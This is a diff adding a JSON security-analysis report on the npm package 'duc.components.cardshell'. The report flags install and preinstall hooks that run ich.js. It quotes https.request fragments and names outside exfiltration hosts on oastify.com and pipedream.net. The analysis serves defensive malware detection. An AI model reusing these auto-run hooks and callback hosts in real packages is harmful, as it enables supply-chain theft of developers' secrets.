@@ -1,0 +1,56 @@
+{
+  "package_metadata": {
+    "name": "duc.components.cardshell",
+    "version": "10.0.5"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [
+      {
+        "location": "package/ich.js:35",
+        "code_snippet": "var req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        process.stdout.write(d);\n    });\n});\n",
+        "description": "Exfiltrating sensitive data to a remote server."
+      },
+      {
+        "location": "package/test.js:24",
+        "code_snippet": "const req = https.request(options, res => {});\n",
+        "description": "Exfiltrating sensitive data to a remote server."
+      }
+    ],
+    "process_actions": [
+      {
+        "location": "package/package.json:8",
+        "code_snippet": "    \"install\": \"node ich.js\",\n",
+        "description": "Script automatically runs during package installation."
+      },
+      {
+        "location": "package/package.json:9",
+        "code_snippet": "    \"preinstall\": \"node ich.js\"\n",
+        "description": "Script automatically runs during package installation."
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/ich.js",
+        "code_snippet": "    hostname: \"fdwlqag58783hhfj5oa243h5uw0noei27.oastify.com\", //backend\n"
+      },
+      {
+        "filename": "package/test.js",
+        "code_snippet": "  hostname: 'eo33kmsodf3dxtf.m.pipedream.net',\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.85,
+    "confidence": 0.92,
+    "indicators": [
+      "Pre/post-install scripts with harmful commands",
+      "Network call anomalies",
+      "Environment variable exfiltration",
+      "Obfuscated payload delivery"
+    ]
+  }
+}
